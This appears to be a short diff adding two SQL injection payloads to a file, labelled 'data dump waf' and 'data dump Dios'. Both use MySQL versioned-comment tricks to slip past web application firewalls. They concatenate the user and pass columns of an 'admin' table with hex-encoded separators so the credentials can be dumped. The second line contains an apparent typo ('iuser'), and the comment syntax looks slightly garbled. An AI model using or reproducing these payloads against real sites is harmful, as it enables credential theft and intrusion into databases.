@@ -1,0 +1,3 @@
+data dump waf : (/!50000SELECT/+/!50000GROUP_CONCAT(user ,0x203a3a20,pass+SEPARATOR+0x3c62723e)/+/!50000FROM/+admin )
+
+data dump Dios : (/!50000SELECT/+/!50000GROUP_CONCAT(iuser,0x203a3a20, pass+SEPARATOR+0x3c62723e)/+/!50000FROM/+admin )
